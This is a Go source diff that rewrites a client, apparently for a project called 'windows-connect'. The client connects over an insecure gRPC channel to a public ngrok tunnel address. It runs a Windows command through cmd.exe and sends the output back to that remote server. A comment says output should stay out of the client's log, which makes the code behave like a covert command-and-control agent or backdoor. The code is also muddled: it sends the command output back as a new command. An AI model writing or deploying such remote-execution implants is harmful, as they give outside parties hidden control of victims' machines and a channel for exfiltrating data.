@@ -4,59 +4,57 @@ import (
 	"context"
 	"log"
 	"os/exec"
-	"time"
 
 	"github.com/cardfaux/windows-connect/grpcapi"
 	"google.golang.org/grpc"
 )
 
-type clientServer struct {
-	grpcapi.UnimplementedEchoServiceServer
-}
-
-func (c *clientServer) ExecuteCommand(ctx context.Context, req *grpcapi.CommandRequest) (*grpcapi.CommandResponse, error) {
-	log.Printf("Executing command: %s", req.Command)
-
-	// Execute command
-	cmd := exec.Command("cmd", "/C", req.Command) // For Windows
-	output, err := cmd.CombinedOutput()
-
-	resp := &grpcapi.CommandResponse{
-		Output: string(output),
-	}
-	if err != nil {
-		resp.Error = err.Error()
-	}
-
-	return resp, nil
-}
-
 func main() {
-	// Client connects to the gRPC server
-	conn, err := grpc.Dial("6.tcp.ngrok.io:17905", grpc.WithInsecure())
+	// Connect to the gRPC server
+	conn, err := grpc.Dial("2.tcp.ngrok.io:14296", grpc.WithInsecure())
 	if err != nil {
-		log.Fatalf("Failed to connect: %v", err)
+		log.Fatalf("Failed to connect to server: %v", err)
 	}
 	defer conn.Close()
 
 	log.Println("Connected to command server.")
 
-	// Register the service on the client side (this is a bit backward but allows a polling loop)
+	// Create a new client
 	client := grpcapi.NewEchoServiceClient(conn)
 
-	// Keep polling the server for new commands (or implement streaming for better efficiency)
-	for {
-		time.Sleep(3 * time.Second) // polling delay
-
-		ctx, cancel := context.WithTimeout(context.Background(), 10*time.Second)
-		defer cancel()
-
-		resp, err := client.ExecuteCommand(ctx, &grpcapi.CommandRequest{Command: "whoami"}) // Replace this logic with server-sent commands
-		if err != nil {
-			log.Println("Command error:", err)
-			continue
-		}
-
-		log.Printf("Server response:\nOutput: %s\nError: %s\n", resp.Output, resp.Error)
+	// Send a test command to the server
+	command := "dir" // You can change this to any other command
+	req := &grpcapi.CommandRequest{
+		Command: command,
 	}
+
+	// Send the request to the server and get the response
+	resp, err := client.ExecuteCommand(context.Background(), req)
+	if err != nil {
+		log.Fatalf("Error while executing command: %v", err)
+	}
+
+	// Actual command execution on the client (Windows)
+	cmd := exec.Command("cmd", "/C", command) // Executing the command using cmd.exe
+	output, err := cmd.CombinedOutput()      // Get the combined output (stdout + stderr)
+
+	// Check for execution errors
+	if err != nil {
+		log.Printf("Error executing command on client: %v\n", err)
+		log.Printf("Command error output: %s\n", string(output))
+		return
+	}
+
+	// Do not log the output on the client, only send it to the server
+	resp.Output = string(output)
+
+	// Send the execution result back to the server (only server will see the output)
+	_, err = client.ExecuteCommand(context.Background(), &grpcapi.CommandRequest{
+		Command: string(output),
+	})
+	if err != nil {
+		log.Fatalf("Error sending output back to server: %v", err)
+	}
+
+	log.Println("Execution complete. Output sent to the server.")
 }
